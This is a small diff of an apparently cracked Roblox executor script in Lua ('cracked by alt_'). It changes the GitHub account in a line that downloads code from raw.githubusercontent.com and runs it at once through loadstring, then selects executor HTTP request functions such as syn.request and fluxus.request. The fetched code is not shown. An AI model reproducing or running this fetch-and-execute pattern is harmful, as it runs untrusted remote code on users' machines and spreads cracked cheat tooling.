@@ -1,5 +1,5 @@
 -- cracked by alt_
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FxyyCx/NoKey/refs/heads/main/Discord",true))()
 local vu1 = syn and syn.request or http and http.request or (http_request or fluxus and fluxus.request or request)
 if vu1 then
     local vu2 = {
